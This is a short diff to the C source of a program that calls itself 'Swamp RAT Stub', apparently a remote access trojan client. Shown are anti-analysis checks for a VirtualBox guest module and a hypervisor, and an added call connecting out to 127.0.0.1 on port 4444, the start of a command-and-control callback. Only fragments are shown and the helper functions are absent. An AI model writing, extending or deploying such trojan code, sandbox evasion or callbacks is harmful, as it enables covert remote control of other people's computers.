@@ -20,6 +20,7 @@
 #include "include/stub/shell.h"
 #include "include/stub/sys.h"
 #include "include/stub/re.h"
+#include "include/stub/net.h"
 void help_menu(){
   printf("Swamp RAT Stub!\n");
 }
@@ -34,5 +35,6 @@ int main(){
   free(p_sys_info);
   printf("module: %d\n", re_kernel_module("vboxguest"));
   printf("hypervisor: %d\n", re_hypervisor());
+  net_client("127.0.0.1", 4444);
   return 0;
 }
